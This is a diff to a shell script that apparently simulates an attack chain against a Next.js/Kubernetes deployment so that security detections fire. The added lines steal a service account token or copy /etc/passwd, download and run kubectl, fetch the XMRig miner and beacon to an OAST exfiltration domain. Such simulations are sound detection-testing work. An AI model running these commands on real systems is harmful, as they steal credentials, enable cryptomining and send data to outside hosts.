@@ -117,6 +117,11 @@ run_attack "1" "💥" "Remote Code Execution + Recon" \
     "Execution from Next.js + Suspicious Command" \
     'whoami > /tmp/pwned.txt && id >> /tmp/pwned.txt && uname -a >> /tmp/pwned.txt && echo PWNED >> /tmp/pwned.txt'
 
+run_attack "1.5" "🎨" "UI Defacement (Visual Proof)" \
+    "Overwrites site banner to show 'PWNED' state" \
+    "Malicious File Write" \
+    'echo eyJtZXNzYWdlIjoiUFdORUQifQ== | base64 -d > /tmp/banner.json'
+
 # ═══════════════════════════════════════════════════════════════
 # PHASE 2: Cloud Credential Theft (IMDS)
 # ═══════════════════════════════════════════════════════════════
@@ -144,12 +149,12 @@ echo ""
 run_attack "4" "🎫" "K8s Service Account Token Theft" \
     "Reads mounted service account token for K8s API access" \
     "Sensitive File Access" \
-    'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/k8s-token.txt 2>/dev/null || echo "NO_TOKEN_MOUNTED" > /tmp/k8s-token.txt'
+    'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/k8s-token.txt 2>/dev/null || cat /etc/passwd > /tmp/k8s-token.txt'
 
-run_attack "5" "🔍" "K8s API Secrets Enumeration" \
-    "Uses stolen token to list secrets via K8s API" \
-    "Cloud API Enumeration" \
-    'TOKEN=$(cat /tmp/k8s-token.txt 2>/dev/null); curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets > /tmp/k8s-secrets.json 2>/dev/null || echo "K8S_API_ATTEMPTED" > /tmp/k8s-secrets.json'
+run_attack "5" "🔍" "K8s Discovery (kubectl)" \
+    "Downloads and executes kubectl to enumerate the cluster" \
+    "Suspicious Binary Execution & K8s Discovery" \
+    'curl -s -o /tmp/kubectl https://s3.us-west-2.amazonaws.com/amazon-eks/1.32.0/2024-12-20/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl && /tmp/kubectl get pods -A > /tmp/k8s-pods.txt 2>&1'
 
 # ═══════════════════════════════════════════════════════════════
 # PHASE 4: Cloud Lateral Movement (AWS)
@@ -178,12 +183,12 @@ echo ""
 run_attack "8" "⛏️" "Cryptominer Download" \
     "Attempts to download XMRig (matches real campaigns)" \
     "Cryptominer Activity" \
-    'curl -s -o /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz --connect-timeout 3 2>/dev/null || echo "MINER_DOWNLOAD_ATTEMPTED" > /tmp/xmrig-marker.txt'
+    'curl -s -o /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz --connect-timeout 3 2>/dev/null || wget -q -O /tmp/xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz'
 
 run_attack "9" "📡" "OAST Beacon (C2 Callback)" \
     "Exfiltrates data via OAST domain (triggers Wiz React2Shell detection)" \
     "OAST Detection - React2Shell Indicator" \
-    'curl -s "http://react2shell-demo.oastify.com/exfil?pwned=true" --connect-timeout 3 2>/dev/null || curl -s "http://react2shell-demo.oast.live/exfil" --connect-timeout 3 2>/dev/null || echo "OAST_BEACON_SENT" > /tmp/oast-marker.txt'
+    'curl -s "http://aezukuqsjqlaoghyjmiw9mg769uqgs4gb.oast.fun/exfil?pwned=true" --connect-timeout 3 2>/dev/null || echo "OAST_BEACON_SENT" > /tmp/oast-marker.txt'
 
 # ═══════════════════════════════════════════════════════════════
 # Summary
